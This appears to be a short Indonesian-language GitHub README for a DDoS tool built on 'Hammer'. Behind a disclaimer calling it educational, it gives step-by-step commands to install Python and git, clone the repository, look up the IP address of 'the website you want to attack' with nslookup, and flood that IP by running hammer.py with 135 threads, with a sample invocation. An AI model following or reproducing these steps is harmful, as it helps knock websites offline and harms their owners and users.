<b>PERHATIAN... SAYA TIDAK BERTANGGUNG JAWAB ATAS SEGALA DAMPAK YANG AKAN TERJADI</b><br>
<b>TOOLS INI TERBUKA HANYA SEBAGAI EDUKASI, JANGAN DISALAHKGUNAKAN</b><br><br>

$ apt update && apt upgrade (update dan upgrade tools yg sudah ada)<br>
$ apt install python (install python bagi yg belum punya) <br>
$ apt install git (install git biar bisa input command git clone)<br> 
$ git clone https://github.com/rifandani/ddos-hammer.git <br><br>

DDOS tools ini berbasis "Hammer" tool yang membutuhkan <b>Name Server</b> dari website yang ingin anda serang<br>
Biar bisa mendapatkan "Name Server" nya... input command<br>
$ apt install dnsutils (install biar bisa input command nslookup)<br>
$ nslookup example.com <br>
Catat IP Address dari Website tersebut...<br><br>

Kalau semua sudah siap, masuk ke direktori <br>
$ cd ddos-hammer<br>
$ python hammer.py -s [ip Address] -t 135<br>
contoh:<br>
$ python hammer.py -s 123.45.67.89 -t 135<br>

Silahkan di STAR dan FORK jika bermanfaat